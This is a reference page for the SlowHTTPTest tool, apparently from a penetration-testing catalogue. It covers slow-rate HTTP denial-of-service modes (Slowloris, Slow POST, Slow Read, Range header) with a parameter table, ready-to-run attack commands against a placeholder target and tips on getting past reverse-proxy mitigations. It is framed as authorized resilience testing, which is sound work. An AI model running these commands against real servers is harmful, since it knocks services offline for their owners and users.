# SlowHTTPTest

- **Category**: Web / HTTP Slow Attack
- **Risk Level**: 🔴 High

---

## Description

Tests web server resilience against HTTP slow-rate denial-of-service attacks. Implements four attack modes: Slowloris (incomplete headers), Slow POST (slow request body), Slow Read (small TCP receive window), and Apache Range Header (overlapping range requests). Measures server availability throughout the test and outputs CSV/HTML statistics for reporting. Essential for validating DoS mitigation controls during authorized assessments.

## Installation

```bash
sudo apt install slowhttptest
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-H` | Slow headers mode (Slowloris, default) |
| `-B` | Slow body mode (R-U-Dead-Yet) |
| `-R` | Range attack mode (Apache killer) |
| `-X` | Slow read mode |
| `-u <URL>` | Absolute URL of target (default: http://localhost/) |
| `-c <num>` | Target number of connections (default: 50) |
| `-r <num>` | Connections per second (default: 50) |
| `-l <seconds>` | Target test length in seconds (default: 240) |
| `-i <seconds>` | Interval between follow-up data packets in seconds (default: 10) |
| `-s <bytes>` | Value of Content-Length header if needed (default: 4096) |
| `-t <verb>` | HTTP method to use (default: GET for Slowloris, POST for Slow POST) |
| `-p <seconds>` | Timeout to wait for HTTP response on probe connection (default: 5) |
| `-o <file>` | Save statistics output in file.html and file.csv (`-g` required) |
| `-g` | Generate statistics with socket state changes |
| `-x <bytes>` | Max length of each randomized name/value pair of follow-up data per tick (default: 32) |
| `-f <content-type>` | Value of Content-type header (default: application/x-www-form-urlencoded) |
| `-d <host:port>` | Direct all traffic through HTTP proxy |
| `-e <host:port>` | Direct probe traffic through HTTP proxy |
| `-j <cookies>` | Value of Cookie header |
| `-v <level>` | Verbosity level 0-4: Fatal, Info, Error, Warning, Debug |
| `-k <num>` | Repeat same request N times per connection (slow read, default: 1) |
| `-n <seconds>` | Interval between read operations from recv buffer (slow read, default: 1) |
| `-w <bytes>` | Start of advertised window size range (slow read, default: 1) |
| `-y <bytes>` | End of advertised window size range (slow read, default: 512) |
| `-z <bytes>` | Bytes to read from receive buffer per read() call (slow read, default: 5) |

## Common Commands

```bash
# Slowloris attack — 1000 connections over 300 seconds
slowhttptest -c 1000 -H -i 10 -r 200 -l 300 \
  -u http://target.com/ -t GET -o /tmp/slowloris -g

# Slow POST attack — send body slowly
slowhttptest -c 1000 -B -i 110 -r 200 -l 300 \
  -s 8192 -u http://target.com/login -t POST \
  -o /tmp/slowpost -g

# Slow Read attack — small receive window
slowhttptest -c 1000 -X -r 200 -l 300 \
  -u http://target.com/ -o /tmp/slowread -g

# Range header attack
slowhttptest -c 500 -R -r 100 -l 180 \
  -u http://target.com/ -o /tmp/range -g

# Slowloris via HTTPS with high verbosity
slowhttptest -c 500 -H -i 10 -r 100 -l 240 \
  -u https://target.com/ -v 4 -o /tmp/slowloris_https -g

# Quick resilience check — short test, moderate connections
slowhttptest -c 200 -H -i 10 -r 50 -l 60 \
  -u http://target.com/ -o /tmp/quick_test -g
```

## Notes & Tips

1. Always use `-g` with `-o` to generate CSV/HTML statistics — these provide evidence of server availability degradation for reports.
2. Start with moderate connection counts (`-c 200`) and increase gradually; overwhelming the target prematurely may trigger infrastructure-level protections that mask application-layer weaknesses.
3. Slowloris (`-H`) tests header-processing limits, while Slow POST (`-B`) tests body-processing limits — test both modes as servers may be vulnerable to one but not the other.
4. Modern reverse proxies (nginx, Cloudflare) typically mitigate Slowloris; Slow Read (`-X`) often bypasses these protections since it exploits the response delivery path rather than the request path.
5. The `-p` probe timeout controls how SlowHTTPTest detects server availability — adjust if the server has unusually long legitimate response times.

---

## Official References

- [SlowHTTPTest GitHub](https://github.com/shekyan/slowhttptest)
- [Kali Tools — slowhttptest](https://www.kali.org/tools/slowhttptest/)
